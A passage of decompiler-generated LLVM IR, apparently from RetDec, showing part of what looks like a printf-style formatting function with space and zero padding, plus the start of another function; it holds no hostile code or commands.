  br label %dec_label_pc_11268

dec_label_pc_110e8:                               ; preds = %bb159
  %v2_110e8 = icmp eq i32 %v5_110f8, 0
  br i1 %v2_110e8, label %bb160, label %dec_label_pc_110f4

bb160:                                            ; preds = %dec_label_pc_110e8
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_11268

dec_label_pc_110f4:                               ; preds = %dec_label_pc_110e8, %bb157
  %v2_110f4 = sub i32 %v5_110f8, %v1_11088
  %tmp199 = icmp ugt i32 %v5_110f8, %v1_11088
  br i1 %tmp199, label %.thread90, label %dec_label_pc_11268

.thread90:                                        ; preds = %dec_label_pc_110f4
  store i32 %v2_110f4, i32* @r4, align 4
  br label %dec_label_pc_11284thread-pre-split

dec_label_pc_11104:                               ; preds = %dec_label_pc_10f78
  br i1 %tmp196, label %dec_label_pc_11140, label %dec_label_pc_1110c

dec_label_pc_1110c:                               ; preds = %dec_label_pc_11104
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_11118 = load i32, i32* @fp, align 4
  store i32 %v0_11118, i32* %r0.global-to-local, align 4
  %v2_1111c = load i32, i32* %v1_10f60, align 4
  %v5_1111c = load i32, i32* %v4_1111c, align 4
  store i32 %v5_1111c, i32* %r2.global-to-local, align 4
  store i32 %v2_11120, i32* %r3.global-to-local, align 4
  %v6_11124 = call i32 @function_146bc(i32 %v0_11118, i32 %v2_1111c, i32 %v5_1111c, i32* nonnull %stack_var_-328, i32 68996)
  store i32 %v6_11124, i32* %r0.global-to-local, align 4
  %v1_11128 = icmp slt i32 %v6_11124, 0
  br i1 %v1_11128, label %dec_label_pc_113d4, label %dec_label_pc_11130

dec_label_pc_11130:                               ; preds = %dec_label_pc_1110c
  %v2_11134 = add i32 %v6_11124, %stack_var_-336.2
  store i32 %v2_11134, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_113c0

dec_label_pc_11140:                               ; preds = %dec_label_pc_11104
  br i1 %v3_11144, label %dec_label_pc_111e0, label %dec_label_pc_11148

dec_label_pc_11148:                               ; preds = %dec_label_pc_11140
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_11140, label %dec_label_pc_11158, label %dec_label_pc_111a8

dec_label_pc_11158:                               ; preds = %dec_label_pc_11148
  %v2_11158 = load i32, i32* %v1_10f60, align 4
  store i32 %v2_11158, i32* %r3.global-to-local, align 4
  %v9_1115c = icmp eq i32 %v2_11158, 0
  store i32 %v2_11158, i32* %stack_var_-44, align 4
  br i1 %v9_1115c, label %dec_label_pc_11270, label %dec_label_pc_11168

dec_label_pc_11168:                               ; preds = %dec_label_pc_11158
  %v3_11168 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_11168, i32* %r3.global-to-local, align 4
  store i32 %v2_1116c, i32* @r0, align 4
  %v5_11178 = icmp slt i32 %v3_11168, -1
  br i1 %v5_11178, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_11168
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_11168, %bb161
  %storemerge193 = phi i32 [ %v3_11168, %bb161 ], [ -1, %dec_label_pc_11168 ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_1116c, i32* @r1, align 4
  store i32 %v2_11180, i32* %r3.global-to-local, align 4
  %v0_11184 = call i32 @function_140f4()
  store i32 %v0_11184, i32* %r0.global-to-local, align 4
  %v7_11188 = icmp eq i32 %v0_11184, -1
  store i32 %v0_11184, i32* @r5, align 4
  br i1 %v7_11188, label %dec_label_pc_113d4, label %dec_label_pc_11194

dec_label_pc_11194:                               ; preds = %bb162
  %v0_11194 = load i32, i32* @sl, align 4
  store i32 %v0_11194, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_11194, i32* @r6, align 4
  br label %dec_label_pc_11284

dec_label_pc_111a8:                               ; preds = %dec_label_pc_11148
  store i32 %v2_11250, i32* %r8.global-to-local, align 4
  %v2_111ac = load i32, i32* %v1_10f60, align 4
  store i32 %v2_11180, i32* %r2.global-to-local, align 4
  store i32 %v2_11250, i32* %r0.global-to-local, align 4
  %v3_111b8 = call i32 @function_140a4(i32 %v2_11250, i32 %v2_111ac, i32 %v2_11180)
  store i32 %v3_111b8, i32* %r0.global-to-local, align 4
  %v7_111bc = icmp eq i32 %v3_111b8, -1
  store i32 %v3_111b8, i32* @r5, align 4
  br i1 %v7_111bc, label %dec_label_pc_113d4, label %dec_label_pc_111c8

dec_label_pc_111c8:                               ; preds = %dec_label_pc_111a8
  %v0_111c8 = load i32, i32* @sl, align 4
  store i32 %v0_111c8, i32* @r4, align 4
  store i32 %v2_11250, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_111d8 = trunc i32 %v0_111c8 to i8
  %v2_111d8 = load i32, i32* %r8.global-to-local, align 4
  %v4_111d8 = add i32 %v2_111d8, %v3_111b8
  %v5_111d8 = inttoptr i32 %v4_111d8 to i8*
  store i8 %v1_111d8, i8* %v5_111d8, align 1
  %v0_11288.pre.pre = load i32, i32* @r5, align 4
  %v1_11288.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11284thread-pre-split

dec_label_pc_111e0:                               ; preds = %dec_label_pc_11140
  br i1 %v3_111e4, label %dec_label_pc_11244, label %dec_label_pc_111e8

dec_label_pc_111e8:                               ; preds = %dec_label_pc_111e0
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_111f0 = load i32, i32* %v1_10f60, align 4
  br i1 %v7_111e0, label %dec_label_pc_111f0, label %dec_label_pc_1121c

dec_label_pc_111f0:                               ; preds = %dec_label_pc_111e8
  store i32 %v2_111f0, i32* @r6, align 4
  %v2_111f4 = icmp eq i32 %v2_111f0, 0
  br i1 %v2_111f4, label %dec_label_pc_11270, label %dec_label_pc_111fc

dec_label_pc_111fc:                               ; preds = %dec_label_pc_111f0, %dec_label_pc_1124c
  %v0_1120c = phi i32 [ %v2_111f0, %dec_label_pc_111f0 ], [ %v3_1125c, %dec_label_pc_1124c ]
  %v3_111fc = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_111fc, i32* %r3.global-to-local, align 4
  %v5_11208 = icmp slt i32 %v3_111fc, -1
  br i1 %v5_11208, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_111fc
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_111fc, %bb163
  %storemerge194 = phi i32 [ %v3_111fc, %bb163 ], [ -1, %dec_label_pc_111fc ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_1120c, i32* %r0.global-to-local, align 4
  %v1_11210 = inttoptr i32 %v0_1120c to i8*
  %v2_11210 = call i32 @function_1206c(i8* %v1_11210)
  store i32 %v2_11210, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11278

dec_label_pc_1121c:                               ; preds = %dec_label_pc_111e8
  store i32 %v2_111f0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_11250, i32* @r6, align 4
  store i32 %v2_111f0, i32* %stack_var_-180, align 4
  br label %dec_label_pc_11284thread-pre-split

dec_label_pc_11244:                               ; preds = %dec_label_pc_111e0
  br i1 %v7_11244, label %dec_label_pc_1124c, label %dec_label_pc_113d4

dec_label_pc_1124c:                               ; preds = %dec_label_pc_11244
  %v0_1124c = call i32 @function_10a18()
  store i32 %v0_1124c, i32* %r0.global-to-local, align 4
  %v1_11254 = inttoptr i32 %v0_1124c to i32*
  %v2_11254 = load i32, i32* %v1_11254, align 4
  store i32 %v2_11254, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_1125c = call i32 @function_12244(i32 %v2_11254, i32 %v2_11250, i32 128)
  store i32 %v3_1125c, i32* %r0.global-to-local, align 4
  store i32 %v3_1125c, i32* @r6, align 4
  br label %dec_label_pc_111fc

dec_label_pc_11268:                               ; preds = %dec_label_pc_110f4, %.thread26, %bb160
  %v0_11288.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_11088, %dec_label_pc_110f4 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_11284thread-pre-split

dec_label_pc_11270:                               ; preds = %dec_label_pc_111f0, %dec_label_pc_11158
  store i32 ptrtoint ([7 x i8]* @global_var_17558.256 to i32), i32* @r6, align 4
  br label %dec_label_pc_11278

dec_label_pc_11278:                               ; preds = %bb164, %dec_label_pc_11270
  %storemerge = phi i32 [ 6, %dec_label_pc_11270 ], [ %v2_11210, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_11284

dec_label_pc_11284thread-pre-split:               ; preds = %.thread90, %dec_label_pc_111c8, %dec_label_pc_1121c, %dec_label_pc_11268
  %v1_11288.pre = phi i32 [ 0, %dec_label_pc_11268 ], [ %v1_11288.pre.pre, %dec_label_pc_111c8 ], [ 0, %dec_label_pc_1121c ], [ %v2_110f4, %.thread90 ]
  %v0_11288.pre = phi i32 [ %v0_11288.pre81, %dec_label_pc_11268 ], [ %v0_11288.pre.pre, %dec_label_pc_111c8 ], [ 1, %dec_label_pc_1121c ], [ %v1_11088, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_1107c, %dec_label_pc_11268 ], [ %v0_10fa8, %dec_label_pc_111c8 ], [ %v0_10fa8, %dec_label_pc_1121c ], [ %v0_1107c, %.thread90 ]
  %v0_11284.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_11284

dec_label_pc_11284:                               ; preds = %dec_label_pc_11284thread-pre-split, %dec_label_pc_11194, %dec_label_pc_11278
  %v1_112c4 = phi i32 [ %v1_11288.pre, %dec_label_pc_11284thread-pre-split ], [ %v0_11194, %dec_label_pc_11194 ], [ 0, %dec_label_pc_11278 ]
  %v0_11288 = phi i32 [ %v0_11288.pre, %dec_label_pc_11284thread-pre-split ], [ %v0_11184, %dec_label_pc_11194 ], [ %storemerge, %dec_label_pc_11278 ]
  %v0_11290 = phi i32 [ %v0_11284.pr, %dec_label_pc_11284thread-pre-split ], [ 11, %dec_label_pc_11194 ], [ 11, %dec_label_pc_11278 ]
  %v0_112cc = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_11284thread-pre-split ], [ %v0_10fa8, %dec_label_pc_11194 ], [ %v0_10fa8, %dec_label_pc_11278 ]
  %v7_11284 = icmp eq i32 %v0_11290, 11
  %v2_11288 = add i32 %v0_11288, %v1_112c4
  br i1 %v7_11284, label %dec_label_pc_112a0, label %bb165

bb165:                                            ; preds = %dec_label_pc_11284
  %v7_11298 = icmp sgt i32 %v0_11290, 5
  %. = select i1 %v7_11298, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_1129c = add i32 %., %v2_11288
  br label %dec_label_pc_112a0

dec_label_pc_112a0:                               ; preds = %dec_label_pc_11284, %bb165
  %v0_112b4 = phi i32 [ %v2_11288, %dec_label_pc_11284 ], [ %v2_1129c, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_112a4 = sub i32 %tmp97, %v0_112b4
  %v3_112a4 = icmp uge i32 %tmp97, %v0_112b4
  %v9_112a4 = icmp eq i32 %tmp97, %v0_112b4
  %v2_112a8 = xor i1 %v3_112a4, true
  %v3_112a8 = or i1 %v9_112a4, %v2_112a8
  br i1 %v3_112a8, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_112a0
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_112a0, %bb166
  %v2_112ac = xor i1 %v9_112a4, true
  %v3_112ac = and i1 %v3_112a4, %v2_112ac
  br i1 %v3_112ac, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_112b4.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_112a4, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_112c4 = phi i32 [ %v1_112b4.pre, %._crit_edge ], [ %v2_112a4, %bb168 ]
  %v2_112b4 = add i32 %v0_112b4, %stack_var_-336.2
  %v2_112b8 = add i32 %v2_112b4, %v2_112c4
  store i32 %v2_112b8, i32* %ip.global-to-local, align 4
  store i32 %v0_112cc, i32* %r3.global-to-local, align 4
  %v0_112c0 = load i32, i32* @sb, align 4
  %v7_112c0 = icmp eq i32 %v0_112c0, 48
  br i1 %v7_112c0, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_112c4 = add i32 %v2_112c4, %v1_112c4
  store i32 %v3_112c4, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_112e0 = phi i32 [ %v2_112c4, %bb169 ], [ 0, %bb170 ]
  %v1_112cc = and i32 %v0_112cc, 8
  store i32 %v1_112cc, i32* @r8, align 4
  %v2_112cc = icmp eq i32 %v1_112cc, 0
  br i1 %v2_112cc, label %dec_label_pc_112d8, label %dec_label_pc_112f4

dec_label_pc_112d8:                               ; preds = %.thread29
  %v0_112d8 = load i32, i32* @fp, align 4
  store i32 %v0_112d8, i32* %r0.global-to-local, align 4
  store i32 %v0_112e0, i32* %r2.global-to-local, align 4
  %v4_112e4 = call i32 @function_10d38(i32 %v0_112d8, i8 32, i32 %v0_112e0)
  store i32 %v4_112e4, i32* %r0.global-to-local, align 4
  %v1_112e8 = load i32, i32* @sl, align 4
  %v9_112e8 = icmp eq i32 %v4_112e4, %v1_112e8
  br i1 %v9_112e8, label %dec_label_pc_112f0, label %dec_label_pc_113d4

dec_label_pc_112f0:                               ; preds = %dec_label_pc_112d8
  %v0_112f0 = load i32, i32* @r8, align 4
  store i32 %v0_112f0, i32* @sl, align 4
  %v0_112fc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_112f4

dec_label_pc_112f4:                               ; preds = %.thread29, %dec_label_pc_112f0
  %v0_112fc = phi i32 [ %v0_11290, %.thread29 ], [ %v0_112fc.pre, %dec_label_pc_112f0 ]
  %v0_112f8 = load i32, i32* @fp, align 4
  %v2_112fc = add i32 %v0_112fc, ptrtoint (i32* @global_var_17560.258 to i32)
  store i32 %v2_112fc, i32* %r0.global-to-local, align 4
  %v2_11300 = call i32 @function_11c7c(i32 %v2_112fc, i32 %v0_112f8)
  %v0_11304 = load i32, i32* @fp, align 4
  store i32 %v0_11304, i32* %r0.global-to-local, align 4
  %v0_1130c = load i32, i32* @r4, align 4
  store i32 %v0_1130c, i32* %r2.global-to-local, align 4
  %v4_11310 = call i32 @function_10d38(i32 %v0_11304, i8 48, i32 %v0_1130c)
  store i32 %v4_11310, i32* %r0.global-to-local, align 4
  %v1_11314 = load i32, i32* @r4, align 4
  %v9_11314 = icmp eq i32 %v4_11310, %v1_11314
  br i1 %v9_11314, label %dec_label_pc_1131c, label %dec_label_pc_113d4

dec_label_pc_1131c:                               ; preds = %dec_label_pc_112f4
  %v3_1131c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1131c, i32* %r3.global-to-local, align 4
  %v2_11320 = icmp eq i32 %v3_1131c, 0
  br i1 %v2_11320, label %dec_label_pc_11330, label %dec_label_pc_11390thread-pre-split

dec_label_pc_11330:                               ; preds = %dec_label_pc_1131c
  %v0_11330 = load i32, i32* @r5, align 4
  %v2_11330 = icmp eq i32 %v0_11330, 0
  br i1 %v2_11330, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_11330
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_11330
  %v1_11338 = load i32, i32* @r6, align 4
  store i32 %v1_11338, i32* %r0.global-to-local, align 4
  %v1_11340 = load i32, i32* @fp, align 4
  store i32 %v1_11340, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 70472, i32* @lr, align 4
  %v1_11344 = xor i1 %v2_11330, true
  call void @__pseudo_cond_branch(i1 %v1_11344, i32 ptrtoint (i32* @global_var_1428c.249 to i32))
  %v0_11348 = load i32, i32* %r0.global-to-local, align 4
  %v1_11348 = load i32, i32* @r5, align 4
  %v9_11348 = icmp eq i32 %v0_11348, %v1_11348
  br i1 %v9_11348, label %dec_label_pc_113a8, label %dec_label_pc_113d4

dec_label_pc_11354:                               ; preds = %dec_label_pc_11390
  %v2_11354 = icmp ult i32 %v1_11358, 128
  %.v1_11358 = select i1 %v2_11354, i32 %v1_11358, i32 128
  store i32 %.v1_11358, i32* @r2, align 4
  %v0_11360 = call i32 @function_140f4()
  store i32 %v0_11360, i32* @r4, align 4
  %v2_11364 = icmp eq i32 %v0_11360, 0
  store i32 %v0_11360, i32* %r3.global-to-local, align 4
  store i32 %v2_11250, i32* %r0.global-to-local, align 4
  %v0_11374 = load i32, i32* @fp, align 4
  store i32 %v0_11374, i32* %r2.global-to-local, align 4
  br i1 %v2_11364, label %dec_label_pc_11384, label %dec_label_pc_1137c

dec_label_pc_1137c:                               ; preds = %dec_label_pc_11354
  %v3_1137c = call i32 @function_1428c(i32 %v2_11250, i32 %v0_11360, i32 %v0_11374)
  store i32 %v3_1137c, i32* %r0.global-to-local, align 4
  store i32 %v3_1137c, i32* %r3.global-to-local, align 4
  %v1_11384.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11384

dec_label_pc_11384:                               ; preds = %dec_label_pc_11354, %dec_label_pc_1137c
  %v1_11384 = phi i32 [ 0, %dec_label_pc_11354 ], [ %v1_11384.pre, %dec_label_pc_1137c ]
  %v0_11388 = phi i32 [ 0, %dec_label_pc_11354 ], [ %v3_1137c, %dec_label_pc_1137c ]
  %v9_11384 = icmp eq i32 %v0_11388, %v1_11384
  %v1_11388 = load i32, i32* @r5, align 4
  %v2_11388 = sub i32 %v1_11388, %v0_11388
  store i32 %v2_11388, i32* @r5, align 4
  br i1 %v9_11384, label %dec_label_pc_11390, label %dec_label_pc_113d4

dec_label_pc_11390thread-pre-split:               ; preds = %dec_label_pc_1131c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_11394.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_11390

dec_label_pc_11390:                               ; preds = %dec_label_pc_11390thread-pre-split, %dec_label_pc_11384
  %v1_11358 = phi i32 [ %v0_11394.pr, %dec_label_pc_11390thread-pre-split ], [ %v2_11388, %dec_label_pc_11384 ]
  store i32 %v2_11250, i32* @r6, align 4
  %v2_11394 = icmp eq i32 %v1_11358, 0
  store i32 %v2_1116c, i32* @r1, align 4
  store i32 %v2_11180, i32* %r3.global-to-local, align 4
  store i32 %v2_11250, i32* @r0, align 4
  br i1 %v2_11394, label %dec_label_pc_113a8, label %dec_label_pc_11354

dec_label_pc_113a8:                               ; preds = %dec_label_pc_11390, %.thread36
  %v0_113a8 = load i32, i32* @fp, align 4
  store i32 %v0_113a8, i32* %r0.global-to-local, align 4
  %v0_113b0 = load i32, i32* @sl, align 4
  store i32 %v0_113b0, i32* %r2.global-to-local, align 4
  %v4_113b4 = call i32 @function_10d38(i32 %v0_113a8, i8 32, i32 %v0_113b0)
  store i32 %v4_113b4, i32* %r0.global-to-local, align 4
  %v1_113b8 = load i32, i32* @sl, align 4
  %v9_113b8 = icmp eq i32 %v4_113b4, %v1_113b8
  br i1 %v9_113b8, label %dec_label_pc_113c0, label %dec_label_pc_113d4

dec_label_pc_113c0:                               ; preds = %dec_label_pc_113a8, %dec_label_pc_11130, %dec_label_pc_10f54
  %stack_var_-316.3 = phi i32 [ %v0_10fa8, %dec_label_pc_10f54 ], [ %v0_112cc, %dec_label_pc_113a8 ], [ %v0_10fa8, %dec_label_pc_11130 ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_10f54 ], [ %v2_112b8, %dec_label_pc_113a8 ], [ %v2_11134, %dec_label_pc_11130 ]
  %v3_113c0 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_113c0, i32* @r4, align 4
  br label %dec_label_pc_113c4

dec_label_pc_113c4:                               ; preds = %dec_label_pc_10e64, %dec_label_pc_113c0
  %v0_113c4 = phi i32 [ %v0_113c4.pre, %dec_label_pc_10e64 ], [ %v3_113c0, %dec_label_pc_113c0 ]
  %v0_10fa8 = phi i32 [ %tmp100, %dec_label_pc_10e64 ], [ %stack_var_-316.3, %dec_label_pc_113c0 ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_10e64 ], [ %stack_var_-336.3, %dec_label_pc_113c0 ]
  store i32 %v0_113c4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10e7c.outer

dec_label_pc_10e7c.outer:                         ; preds = %dec_label_pc_113cc, %dec_label_pc_113c4
  %v5_10ea8 = phi i32 [ %v1_10ed8, %dec_label_pc_113cc ], [ %v0_113c4, %dec_label_pc_113c4 ]
  %v0_10e7c49 = phi i32 [ %v1_113cc, %dec_label_pc_113cc ], [ %v0_113c4, %dec_label_pc_113c4 ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_113cc ], [ %stack_var_-336.4, %dec_label_pc_113c4 ]
  %v1_10e7c180 = inttoptr i32 %v0_10e7c49 to i8*
  %v2_10e7c181 = load i8, i8* %v1_10e7c180, align 1
  %v3_10e7c182 = zext i8 %v2_10e7c181 to i32
  store i32 %v3_10e7c182, i32* %r3.global-to-local, align 4
  %v2_10e80183 = icmp eq i8 %v2_10e7c181, 0
  br i1 %v2_10e80183, label %dec_label_pc_10e98, label %bb126

dec_label_pc_113cc:                               ; preds = %dec_label_pc_10ed8
  %v1_113cc = add i32 %v0_10ee0, 2
  store i32 %v1_113cc, i32* @r4, align 4
  br label %dec_label_pc_10e7c.outer

dec_label_pc_113d4:                               ; preds = %dec_label_pc_11244, %dec_label_pc_113a8, %.thread36, %dec_label_pc_112f4, %dec_label_pc_112d8, %dec_label_pc_111a8, %bb162, %dec_label_pc_1110c, %bb130, %dec_label_pc_11384
  br label %dec_label_pc_113dc

dec_label_pc_113dc:                               ; preds = %dec_label_pc_10ecc, %bb, %dec_label_pc_10e4c, %dec_label_pc_113d4
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_10e4c ], [ -1, %dec_label_pc_113d4 ], [ %stack_var_-336.2, %dec_label_pc_10ecc ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v15_10e08, i32* @r8, align 4
  store i32 %v18_10e08, i32* @sb, align 4
  store i32 %v21_10e08, i32* @sl, align 4
  store i32 %v24_10e08, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_113cc, { 1, 0 }
  uselistorder i8 %v2_10e7c181, { 1, 2, 0 }
  uselistorder i32 %v0_10e7c49, { 2, 0, 1 }
  uselistorder i32 %v5_10ea8, { 2, 3, 1, 0 }
  uselistorder i32 %v0_10fa8, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_113c4, { 1, 0, 2 }
  uselistorder i32 %v1_11358, { 2, 1, 0 }
  uselistorder i32 %v0_11360, { 1, 0, 2, 3 }
  uselistorder i32 %v0_112e0, { 1, 0 }
  uselistorder i32 %v2_112c4, { 2, 0, 1 }
  uselistorder i1 %v3_112a4, { 1, 0 }
  uselistorder i32 %v0_112b4, { 0, 2, 3, 1 }
  uselistorder i32 %v2_11288, { 1, 0 }
  uselistorder i32 %v0_112cc, { 1, 0, 2 }
  uselistorder i32 %v3_1125c, { 1, 2, 0 }
  uselistorder i32 %v0_1120c, { 1, 0 }
  uselistorder i32 %v2_111f0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_111b8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_11184, { 1, 2, 0, 3 }
  uselistorder i32 %v1_11088, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_110a4, { 1, 2, 3, 0 }
  uselistorder i32 %v6_11024, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_10f88, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_10f38.pre, { 2, 1, 0 }
  uselistorder i32 %v1_10f30, { 1, 0 }
  uselistorder i32 %v1_10ed8, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_10e98, { 1, 0 }
  uselistorder i32 %v1_10e90.lcssa, { 1, 0 }
  uselistorder i8 %v2_10e7c, { 1, 2, 0 }
  uselistorder i32 %v2_10e90, { 1, 2, 3, 0 }
  uselistorder i1 %v7_1109c, { 1, 0 }
  uselistorder i1 %v7_10fe8, { 1, 2, 0 }
  uselistorder i1 %v7_111e0, { 1, 0 }
  uselistorder i1 %v7_11140, { 1, 0 }
  uselistorder i1 %v7_1102c, { 1, 0 }
  uselistorder i32 %v2_11180, { 0, 2, 1, 3 }
  uselistorder i32 %v2_11250, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_10f60, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_10f34, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_10f14, { 1, 2, 0 }
  uselistorder i32 %v4_10f0c, { 1, 0 }
  uselistorder i32 %v2_10e10, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-328, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 39, 4, 5, 2, 3, 6, 7, 1, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 26, 20, 21, 23, 24, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 7, 6, 9, 8, 10, 11, 13, 12, 39, 14, 40, 15, 42, 16, 17, 43, 18, 44, 19, 1, 20, 22, 21, 38, 23, 35, 24, 36, 37, 25, 26, 27, 2, 41, 34, 28, 33, 29, 30, 32, 31, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32, i32)* @function_11c7c, { 1, 0 }
  uselistorder i32 (i32, i8, i32)* @function_10d38, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_140f4, { 1, 0 }
  uselistorder label %dec_label_pc_113dc, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_113d4, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_113c4, { 1, 0 }
  uselistorder label %dec_label_pc_11384, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_112f4, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_112a0, { 1, 0 }
  uselistorder label %dec_label_pc_11284, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11284thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_11278, { 1, 0 }
  uselistorder label %dec_label_pc_11268, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_111fc, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_10fd8, { 1, 0 }
  uselistorder label %dec_label_pc_10fd4, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10f2c, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_10ecc, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_10e98, { 2, 1, 0 }
}

define i32 @function_113fc(i32* %arg1) local_unnamed_addr {
dec_label_pc_113fc:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_113fc = load i32, i32* @r4, align 4
  store i32 %v3_113fc, i32* %stack_var_-12, align 4
  %v6_113fc = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_11408 = load i32, i32* @r1, align 4
  store i32 %v0_11408, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
